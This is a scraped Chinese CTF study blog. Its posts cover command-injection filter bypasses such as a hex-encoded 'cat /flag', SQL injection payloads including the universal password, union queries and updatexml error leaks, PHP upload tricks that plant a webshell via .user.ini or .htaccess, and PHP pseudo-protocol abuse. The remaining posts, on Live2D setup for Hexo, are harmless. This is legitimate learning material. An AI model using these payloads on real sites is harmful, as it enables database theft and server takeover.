<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) <span class="comment"># =&gt;cat /flag</span></span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\<span class="variable">$0</span> <span class="comment"># =&gt;cat /flag</span></span><br></pre></td></tr></table></figure>
<p>适用于printf没被过滤的情况</p>
<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t fl<span class="string">&#x27;&#x27;</span>ag</span><br><span class="line">ca<span class="string">&quot;&quot;</span>t fl<span class="string">&quot;&quot;</span>ag</span><br></pre></td></tr></table></figure>
<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
<h2 id="可供替换的冷门命令"><a href="#可供替换的冷门命令" class="headerlink" title="可供替换的冷门命令"></a>可供替换的冷门命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p>dir</p>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>tac, sort, more, less, head, tail, (sed)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">SQL注入题型总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-08-31 15:48:10 / Modified: 17:24:49" itemprop="dateCreated datePublished" datetime="2021-08-31T15:48:10+08:00">2021-08-31</time>
            </span>

          
            <span id="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="post-meta-item leancloud_visitors" data-flag-title="SQL注入题型总结" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/31/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SQL架构"><a href="#SQL架构" class="headerlink" title="SQL架构"></a>SQL架构</h2><p>我们可以认为SQL有四层，自顶向下为：数据库，数据库中所含的表，表中的列，列中储存的内容。</p>
<p>一个数据库中有多个表，每一个表由若干行和列组成，列储存的是属性名称，而行储存的是内容。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><code>version()</code>在一些支持的数据库发行版下可以拿到相关版本号，对于搜索历代CVE拿来打很有用处。</li>
<li><code>database()</code>获取当前在查询的数据库名称。</li>
<li><code>information_schema</code>是一个在版本大于5.0后默认存在的数据库，在我们利用的时候提供了非常大的用处。</li>
<li><code>group_concat</code>是一个把多个字符合成一个字符的方法，毕竟泄露的时候一般只能从一个字符的位置泄露出来。</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li><code>database()</code>获知当前数据库名称</li>
<li><code>group_concat(table_name) from information_schema.tables where table_schema=database()</code>获取当前数据库中所有的表的名称</li>
<li><code>group_concat(column_name) from information_schema.columns where table_name=&#39;your_table_name&#39;</code>获取一个表中所有列的名称</li>
<li><code>group_concat(id, username, password) from your_table_name</code>获取<code>id, username, password</code>这些列中储存的值</li>
</ol>
<h2 id="经典万能密码"><a href="#经典万能密码" class="headerlink" title="经典万能密码"></a>经典万能密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<h2 id="常见过滤与绕过方法"><a href="#常见过滤与绕过方法" class="headerlink" title="常见过滤与绕过方法"></a>常见过滤与绕过方法</h2><ul>
<li>空格过滤：套一个括号，如<code>select A from B</code>变成<code>select(A)from(B)</code></li>
<li>双写绕过</li>
</ul>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a><code>union</code>查询</h3><p>经常直接跟在输入的后面，就像这样：<code>password=1&#39; union select ... #</code></p>
<p>就会产生<code>select password from table where password = &#39;1&#39; union select ... #&#39;</code></p>
<p>最后的引号要用井号注释掉，这样才不会产生语法错误。</p>
<p>另，<code>union</code>查询查询到并不存在的内容时，会创建出相应的内容出来，也就是写进了表中。</p>
<h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a><code>updatexml</code>报错</h3><p>原理是在<code>updatexml</code>使用过程中，第二个参数是元素的xpath，查找不到元素不但不会abort掉，还会把原本的经过解析过的参数通过报错信息输出出来。</p>
<p><code>1&#39; or updatexml(1, concat(0x7e, (your_input), 0x7e), 1) #</code></p>
<p>不过报错信息有点短，可以通过<code>left(str, 25)</code>和<code>right(str, 25)</code>的方法分别把左右两部分输出出来拿flag。</p>
<p>相似的常用的截取函数有：</p>
<ul>
<li><code>mid(column_name, start[, length])</code>填入字段，规定从<code>start</code>处开始的<code>length</code>个字符读出来（这里的<code>start</code>下标从1开始）</li>
<li><code>substr(str, start, length)</code>用法类似，下标也是从1开始</li>
<li><code>left(str, n)</code>与<code>right(str, n)</code>，分别查看前n位和后n位</li>
</ul>
<p>此外出现诸如<code>flag</code>被绕过的情况，可以用<code>CHR()</code>来表示一个个字符再用加号concat起来就行了。与<code>CHR</code>对应的是<code>ORD</code>，跟python的名字一样。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">PHP文件上传题型记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-08-30 17:59:34" itemprop="dateCreated datePublished" datetime="2021-08-30T17:59:34+08:00">2021-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-06 19:34:27" itemprop="dateModified" datetime="2021-09-06T19:34:27+08:00">2021-09-06</time>
              </span>

          
            <span id="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="PHP文件上传题型记录" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/30/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h2><p>常规思路是上传一句话木马上去，然后用中国蚁剑拿个webshell。</p>
<p>直接传php文件传不了，就尝试其他也能执行php代码的格式，如：php3, php4, php5, phtml, pht等。</p>
<p>如果都不行，就尝试上传图片木马，在开头添加一个GIF的magic number骗一下，同时POST过去的时候用bp抓个包，把filename改成php代码后缀。</p>
<p>再不行可以尝试上传<code>.user.ini</code>，具体的做法如下：</p>
<p>不抓包修改后缀名，把图片木马直接上传，这一步应该是正常的。</p>
<p>然后再上传一个<code>.user.ini</code>文件，在里面写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;image.gif</span><br></pre></td></tr></table></figure>
<p>该文件上传后，在其所在目录访问任何php代码都会首先把<code>image.gif</code>里面的东西include进来，相当于将一句话木马通过文件包含的形式注入了。</p>
<p>最后直接上中国蚁剑拿webshell，地址即是同目录下的任一个php文件（如果没有就再上传一个普通的php上去然后连） </p>
<p>还有一种做法，提交<code>.htaccess</code>，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><br>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><br>前者把所有上传的东西都当做php文件执行，后者添加了<code>.jpg</code>结尾的文件可以当做php文件执行。</p>
<p>之后跟<code>.user.ini</code>差不多，不需要抓包把后缀名改掉，直接上传jpg文件即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/08/30/Web-Protocols/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/30/Web-Protocols/" class="post-title-link" itemprop="url">Web Protocols</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-08-30 16:40:47 / Modified: 17:39:36" itemprop="dateCreated datePublished" datetime="2021-08-30T16:40:47+08:00">2021-08-30</time>
            </span>

          
            <span id="/2021/08/30/Web-Protocols/" class="post-meta-item leancloud_visitors" data-flag-title="Web Protocols" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/08/30/Web-Protocols/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/30/Web-Protocols/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Common-Web-Protocols"><a href="#Common-Web-Protocols" class="headerlink" title="Common Web Protocols"></a>Common Web Protocols</h2><h3 id="HTTP-amp-HTTPS"><a href="#HTTP-amp-HTTPS" class="headerlink" title="HTTP &amp; HTTPS"></a>HTTP &amp; HTTPS</h3><p>HTTP与HTTPS就是在浏览器中访问互联网网页所用到的协议。</p>
<p>HTTP就是应用最广泛的网络协议，数据在传输的过程中都是明文，所以运用HTTP协议来传输一些隐私数据就不安全。</p>
<p>HTTPS可以理解为安全版的HTTP协议，核心是加入了SSL(Secure Sockets Layer)，通过SSL协议完成对所传输内容的加密。</p>
<p>HTTP是无状态的，通过抓包修改包头通常能够实现身份的伪造，而HTTPS需要身份验证，相对更加安全。</p>
<h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><p>FILE协议是用来访问本地文件的，可以访问文件夹。</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>FTP协议经常用在局域网中，通过该协议来进行文件的快速传输。</p>
<h3 id="BLOB"><a href="#BLOB" class="headerlink" title="BLOB"></a>BLOB</h3><p>目前在一些在线视频音乐播放网页中，在审查html找src的时候经常能够看到以<code>blob::</code>开头的链接，粘贴进浏览器却没法访问。</p>
<p>事实上blob协议的链接是一个本地创建的URL，通过这个只存在于本地的链接去访问视频音乐，并在使用结束后销毁掉该URL，这样能够减少相应文件被直接爬下来的情况出现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = URL.createObjectURL(<span class="keyword">new</span> Blob([<span class="string">&quot;hello, world!&quot;</span>], &#123;<span class="attr">type</span>: <span class="string">&quot;text/plain&quot;</span>&#125;))</span><br><span class="line"><span class="comment">// *url* stores the blob link</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.URL.revokeObjectURL(url)</span><br><span class="line"><span class="comment">// now accessing the url causes 404 error code</span></span><br></pre></td></tr></table></figure>
<h2 id="PHP-Pseudo-protocols"><a href="#PHP-Pseudo-protocols" class="headerlink" title="PHP Pseudo-protocols"></a>PHP Pseudo-protocols</h2><p>PHP的伪协议经常在文件包含的题目中运用到。</p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><code>php://filter</code></h3><p>编码流，可以用来获取php代码。不过如果直接read进来的话会把代码执行掉，想要不执行代码的话一般通过base64加密通过输出拿到手后再解密来看。</p>
<p>Example: <code>php://filter/read=convert.base64.encode/resource=useless.php</code></p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><code>php://input</code></h3><p>输入流，可以用来执行POST数据中的php代码。不过在<code>enctype=&quot;multipart/form-data</code>的时候这种方法会失效。</p>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a><code>data://</code></h3><p>数据流，可以传入数据，支持MIME格式的解析。</p>
<p>Example:</p>
<ul>
<li><code>data://text/plain,&lt;?php phpinfo()?&gt;</code>，可以执行php代码，但没有试过。</li>
<li><code>data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>，最终的结果会是这串加密内容解密后的内容，可用来绕过过滤。</li>
</ul>
<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ul>
<li><code>phar://</code></li>
<li><code>zlib://</code></li>
<li><code>glob://</code></li>
<li><code>rar://</code></li>
<li><code>ogg://</code></li>
<li><code>expect://</code></li>
</ul>
<p>这些没有见过，以后见到再补充吧。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" class="post-title-link" itemprop="url">Concepts about Hyperledger Fabric v2.2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-07-27 20:35:33 / Modified: 21:00:28" itemprop="dateCreated datePublished" datetime="2021-07-27T20:35:33+08:00">2021-07-27</time>
            </span>

          
            <span id="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" class="post-meta-item leancloud_visitors" data-flag-title="Concepts about Hyperledger Fabric v2.2" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/27/Concepts-about-Hyperledger-Fabric-v2-2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://garen-wang.cn/2021/07/23/Hexo-Live2d-moc3-Configuration/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/23/Hexo-Live2d-moc3-Configuration/" class="post-title-link" itemprop="url">Hexo Live2d moc3 Configuration</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-07-23 23:55:17" itemprop="dateCreated datePublished" datetime="2021-07-23T23:55:17+08:00">2021-07-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-07-24 00:50:03" itemprop="dateModified" datetime="2021-07-24T00:50:03+08:00">2021-07-24</time>
              </span>

          
            <span id="/2021/07/23/Hexo-Live2d-moc3-Configuration/" class="post-meta-item leancloud_visitors" data-flag-title="Hexo Live2d moc3 Configuration" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/07/23/Hexo-Live2d-moc3-Configuration/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/07/23/Hexo-Live2d-moc3-Configuration/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天闲着给自己的博客整了个效果，在live2d这方面整点花活。</p>
<p>记录一下，顺便也给hexo博客搭建live2d的方式做一次梳理。</p>
<p>live2d模型一般有几种常见的格式，其中方便web端渲染呈现的有moc跟moc3两种格式。</p>
<p>一般我们从大佬们白嫖到live2d模型下载解压之后会是这样的格式：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/Hexo-Live2d-moc3-Configuration/tree.png">
<p>以jiaran4为例：</p>
<ul>
<li><code>jiaran4.2048</code>或<code>jiaran4.1024</code>存放了模型的材质贴图</li>
<li><code>jiaran4.moc3</code>为模型主体，为二进制文件</li>
<li><code>jiaran4.model3.json</code>为模型的配置文件，会重点标注出其他文件的引用路径</li>
<li><code>jiaran4.physics3.json</code>是物理演算配置文件</li>
<li><code>jiaran4.cdi3.json</code>作为显示信息，不是很重要</li>
</ul>
<p>比较豪华的live2d模型还有：</p>
<ul>
<li><code>jiaran4.pose3.json</code>，初始姿势配置文件</li>
<li><code>motions</code>文件夹，内含若干个<code>xxx.motion3.json</code>的动作配置文件</li>
</ul>
<h2 id="moc模型"><a href="#moc模型" class="headerlink" title="moc模型"></a>moc模型</h2><p>以我拿到的一个崩2德莉莎的模型为例，目的是想要在hexo博客上实装。</p>
<p>是hexo的话，可以方便地使用<a target="_blank" rel="noopener" href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a>这么一个插件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install --save hexo-helper-live2d</span></span><br></pre></td></tr></table></figure>
<p>这个插件有若干个预设模型，随便扒拉几个看下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install --save live2d-widget-model-shizuku</span></span><br></pre></td></tr></table></figure>
<p>看下文件结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── assets</span><br><span class="line">│   ├── exp</span><br><span class="line">│   │   ├── f01.exp.json</span><br><span class="line">│   │   ├── f02.exp.json</span><br><span class="line">│   │   ├── f03.exp.json</span><br><span class="line">│   │   └── f04.exp.json</span><br><span class="line">│   ├── moc</span><br><span class="line">│   │   ├── shizuku.1024</span><br><span class="line">│   │   │   ├── texture_00.png</span><br><span class="line">│   │   │   ├── texture_01.png</span><br><span class="line">│   │   │   ├── texture_02.png</span><br><span class="line">│   │   │   ├── texture_03.png</span><br><span class="line">│   │   │   ├── texture_04.png</span><br><span class="line">│   │   │   └── texture_05.png</span><br><span class="line">│   │   └── shizuku.moc</span><br><span class="line">│   ├── mtn</span><br><span class="line">│   │   ├── flickHead_00.mtn</span><br><span class="line">│   │   ├── flickHead_01.mtn</span><br><span class="line">│   │   ├── flickHead_02.mtn</span><br><span class="line">│   │   ├── idle_00.mtn</span><br><span class="line">│   │   ├── idle_01.mtn</span><br><span class="line">│   │   ├── idle_02.mtn</span><br><span class="line">│   │   ├── pinchIn_00.mtn</span><br><span class="line">│   │   ├── pinchIn_01.mtn</span><br><span class="line">│   │   ├── pinchIn_02.mtn</span><br><span class="line">│   │   ├── pinchOut_00.mtn</span><br><span class="line">│   │   ├── pinchOut_01.mtn</span><br><span class="line">│   │   ├── pinchOut_02.mtn</span><br><span class="line">│   │   ├── shake_00.mtn</span><br><span class="line">│   │   ├── shake_01.mtn</span><br><span class="line">│   │   ├── shake_02.mtn</span><br><span class="line">│   │   ├── tapBody_00.mtn</span><br><span class="line">│   │   ├── tapBody_01.mtn</span><br><span class="line">│   │   └── tapBody_02.mtn</span><br><span class="line">│   ├── shizuku.model.json</span><br><span class="line">│   ├── shizuku.physics.json</span><br><span class="line">│   ├── shizuku.pose.json</span><br><span class="line">│   └── snd</span><br><span class="line">│       ├── flickHead_00.mp3</span><br><span class="line">│       ├── flickHead_01.mp3</span><br><span class="line">│       ├── flickHead_02.mp3</span><br><span class="line">│       ├── pinchIn_00.mp3</span><br><span class="line">│       ├── pinchIn_01.mp3</span><br><span class="line">│       ├── pinchIn_02.mp3</span><br><span class="line">│       ├── pinchOut_00.mp3</span><br><span class="line">│       ├── pinchOut_01.mp3</span><br><span class="line">│       ├── pinchOut_02.mp3</span><br><span class="line">│       ├── shake_00.mp3</span><br><span class="line">│       ├── shake_01.mp3</span><br><span class="line">│       ├── shake_02.mp3</span><br><span class="line">│       ├── tapBody_00.mp3</span><br><span class="line">│       ├── tapBody_01.mp3</span><br><span class="line">│       └── tapBody_02.mp3</span><br><span class="line">└── package.json</span><br><span class="line"></span><br><span class="line">6 directories, 48 files</span><br></pre></td></tr></table></figure>
<p>如果我们有一个moc模型的话，就可以考虑模仿这样的文件格式安排，伪装成能被插件正常执行的模型包，在hexo里面跑起来。</p>
<p>最后我把原来的模型包修改成了这样：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/Hexo-Live2d-moc3-Configuration/theresa.png">
<p>这里有一点需要注意：<strong><code>.model3.json</code>文件内含relative file reference，在调整文件结构的时候也需要把里面的内容也做改动。</strong></p>
<p>最终效果是这样的：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/Hexo-Live2d-moc3-Configuration/result1.png">
<h2 id="moc3模型"><a href="#moc3模型" class="headerlink" title="moc3模型"></a>moc3模型</h2><p>不过这几年来新的模型大多以moc3的格式来传播，用原来moc格式的办法没法直接套用，尝试另外的解决方案。</p>
<p>moc3模型以嘉然为例（<del>然然你带我走吧然然</del></p>
<p>第一种尝试是从这几个repo来看看能不能伪装格式一起套用：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Yukariin/AzurLaneL2DViewer">https://github.com/Yukariin/AzurLaneL2DViewer</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/alg-wiki/AzurLaneL2DViewer">https://github.com/alg-wiki/AzurLaneL2DViewer</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/HCLonely/Live2dV3">https://github.com/HCLonely/Live2dV3</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/LitStronger/live2d-moc3">https://github.com/LitStronger/live2d-moc3</a></li>
</ul>
<p>然后发现不行，遂放弃。</p>
<p>第二种尝试来自这篇博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Arisf/p/14347362.html">https://www.cnblogs.com/Arisf/p/14347362.html</a></p>
<p>首先是需要live2d cubism有关的几个js：</p>
<ul>
<li><code>bundle.js</code>，似乎需要自己生成</li>
